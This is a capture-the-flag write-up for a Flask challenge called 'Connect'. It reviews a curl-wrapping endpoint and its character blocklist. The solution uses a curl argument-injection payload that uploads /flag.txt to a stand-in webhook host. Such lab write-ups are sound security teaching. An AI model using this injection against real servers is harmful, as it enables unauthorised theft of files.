## Connect

<br>

![image](https://user-images.githubusercontent.com/64314534/235333457-a9b5cf23-58a9-4e2d-8d9c-a84cdd29ebe2.png)


This is an Ez web code review challenge (flask) .

<br>

![image](https://user-images.githubusercontent.com/64314534/235333506-1adefff2-669a-4390-bd87-818327e748fc.png)

<br>

All we need is  to start reviewing is the `app.py` file 
<br>

![image](https://user-images.githubusercontent.com/64314534/235333528-af212f02-f06a-4232-a99e-f0050be0dad9.png)

<br>
 
## Let's analyze the code:

<br>

![image](https://user-images.githubusercontent.com/64314534/235333601-450db13c-f1ad-450a-b68b-cd61803637f0.png)

<br>

The application had two routes ['/','/api/curl']

The index route just viewing the index.html file

The `/api/curl` route is doing the following : 
- Take `ip` POST parameter from the HTTP request and store it's value in `url` variable.
- Pass the url to `escape_shell_cmd` function and check if it returns true or false
- If the function returned true our input will be injected in `command` variable which will be like this : 
`curl -s -D - -o /dev/null  our_input | grep -oP '^HTTP.+[0-9]{3}'` 
- Then it will Exexcuted the command variable and check if the `HTTP` string is in the output and if not it will not print the response.
-If the function returned false so, the response will be `Illegal Characters Detected`

<br>

The escape_shell_cmd function will do the following:

<br>

![image](https://user-images.githubusercontent.com/64314534/235346220-eceff5a9-356e-4077-8dd5-1fd97833762e.png)

<br>

- Take an input and check if it contains some illegal chars like :`'&#;\`|*?~<>^()[]{}$\':` 
- If the string had any of these chars the function will return false
- If the string hadn't any of these chars it will return true


## Solution

- Even the function is bypassable but we can solve it by just uploading the flag file to our server by this payload

`-F f=@/flag.txt http://your_web_hook`
so, the command will be like this :
`curl -s -D - -o /dev/null -F f=@/flag.txt http://your_web_hook`

and we will recive the flag : 

<br>

![image](https://user-images.githubusercontent.com/64314534/235347270-f09b06d2-9793-4a2a-8072-3e521ce8dba6.png)

<br>
